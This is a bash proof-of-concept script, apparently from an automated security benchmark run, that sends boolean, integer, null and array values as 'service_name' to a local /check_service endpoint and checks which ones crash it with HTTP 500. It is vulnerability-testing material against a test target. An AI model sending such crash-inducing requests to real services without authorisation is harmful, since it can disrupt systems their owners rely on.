#!/bin/bash
# POC: Demonstrates type confusion vulnerability in /check_service endpoint causing HTTP 500 crashes when non-string types are provided for service_name parameter
# Target: ./repo
# Created: 2025-11-07T17:26:14.971Z
# Session: benchmark-XBEN-068-24-mhp49w3p

# Type Confusion Vulnerability POC - /check_service endpoint
# Tests that the endpoint crashes (HTTP 500) with non-string type values

TARGET="${1:-http://localhost:5000}"
ENDPOINT="/check_service"
URL="${TARGET}${ENDPOINT}"

echo "[*] Type Confusion Vulnerability POC"
echo "[*] Target: $URL"
echo ""

# Check if server is reachable
echo "[*] Testing server connectivity..."
if ! curl -s --connect-timeout 2 "$TARGET" > /dev/null 2>&1; then
  echo "[!] Warning: Cannot connect to $TARGET"
  echo "[!] This POC requires the target server to be running"
fi
echo ""

# Test 1: Baseline - valid string request (should return 200)
echo "[TEST 1] Baseline: Valid string service_name"
echo "Request: {\"service_name\": \"apache\"}"
RESPONSE=$(curl -s -i -X POST "$URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name": "apache"}' 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep -i "HTTP" | head -1 | awk '{print $2}')
BODY=$(echo "$RESPONSE" | tail -n +5)
echo "Response Code: $HTTP_CODE"
echo "Body: $BODY"
echo ""

# Test 2: Type confusion - boolean true (should crash with 500)
echo "[TEST 2] Type Confusion: Boolean TRUE"
echo "Request: {\"service_name\": true}"
RESPONSE=$(curl -s -i -X POST "$URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name": true}' 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep -i "HTTP" | head -1 | awk '{print $2}')
BODY=$(echo "$RESPONSE" | tail -n +5)
echo "Response Code: $HTTP_CODE"
echo "Body: $BODY"
if [[ "$HTTP_CODE" == "500" ]]; then
  echo "✓ VULNERABLE: Boolean true caused HTTP 500"
else
  echo "⚠ Got HTTP $HTTP_CODE (expected 500 for vulnerable state)"
fi
echo ""

# Test 3: Type confusion - integer (should crash with 500)
echo "[TEST 3] Type Confusion: Integer 123"
echo "Request: {\"service_name\": 123}"
RESPONSE=$(curl -s -i -X POST "$URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name": 123}' 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep -i "HTTP" | head -1 | awk '{print $2}')
BODY=$(echo "$RESPONSE" | tail -n +5)
echo "Response Code: $HTTP_CODE"
echo "Body: $BODY"
if [[ "$HTTP_CODE" == "500" ]]; then
  echo "✓ VULNERABLE: Integer 123 caused HTTP 500"
else
  echo "⚠ Got HTTP $HTTP_CODE (expected 500 for vulnerable state)"
fi
echo ""

# Test 4: Type confusion - null (should crash with 500)
echo "[TEST 4] Type Confusion: Null value"
echo "Request: {\"service_name\": null}"
RESPONSE=$(curl -s -i -X POST "$URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name": null}' 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep -i "HTTP" | head -1 | awk '{print $2}')
BODY=$(echo "$RESPONSE" | tail -n +5)
echo "Response Code: $HTTP_CODE"
echo "Body: $BODY"
if [[ "$HTTP_CODE" == "500" ]]; then
  echo "✓ VULNERABLE: Null caused HTTP 500"
else
  echo "⚠ Got HTTP $HTTP_CODE (expected 500 for vulnerable state)"
fi
echo ""

# Test 5: Type confusion - boolean false (should crash with 500)
echo "[TEST 5] Type Confusion: Boolean FALSE"
echo "Request: {\"service_name\": false}"
RESPONSE=$(curl -s -i -X POST "$URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name": false}' 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep -i "HTTP" | head -1 | awk '{print $2}')
BODY=$(echo "$RESPONSE" | tail -n +5)
echo "Response Code: $HTTP_CODE"
echo "Body: $BODY"
if [[ "$HTTP_CODE" == "500" ]]; then
  echo "✓ VULNERABLE: Boolean false caused HTTP 500"
else
  echo "⚠ Got HTTP $HTTP_CODE (expected 500 for vulnerable state)"
fi
echo ""

# Test 6: Type confusion - array (should work according to finding - converted to string)
echo "[TEST 6] Array type (should convert to string and work)"
echo "Request: {\"service_name\": [\"apache\", \"mysql\"]}"
RESPONSE=$(curl -s -i -X POST "$URL" \
  -H "Content-Type: application/json" \
  -d '{"service_name": ["apache", "mysql"]}' 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep -i "HTTP" | head -1 | awk '{print $2}')
BODY=$(echo "$RESPONSE" | tail -n +5)
echo "Response Code: $HTTP_CODE"
echo "Body: $BODY"
if [[ "$HTTP_CODE" == "200" ]]; then
  echo "✓ EXPECTED: Array converted to string and returned 200"
else
  echo "⚠ Got HTTP $HTTP_CODE (expected 200)"
fi
echo ""

echo "[*] POC Execution Complete"